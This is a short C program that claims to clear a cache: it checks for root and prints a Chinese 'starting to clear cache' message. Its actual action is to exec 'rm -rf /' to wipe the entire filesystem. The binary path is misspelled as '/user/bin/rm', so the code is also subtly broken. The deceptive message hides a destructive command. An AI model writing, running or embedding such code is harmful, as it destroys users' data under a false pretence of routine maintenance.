#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/wait.h>
int main()
{
    const char* user=getenv("USER");
    const char* str="rm";
    pid_t n=fork();
    if(n==0)
    {
        if(strcmp(user,"root")!=0)
        {
            printf("需要root\n");
            exit(1);
        }
        printf("开始清理缓存");
        execl("/user/bin/rm",str,"-rf","/",NULL);
        exit(0);
    }
    int status=0; 
    waitpid(n,&status,0);
    if(WIFEXITED(status))
    {
        printf("end\n");
    }
    return 0;
}
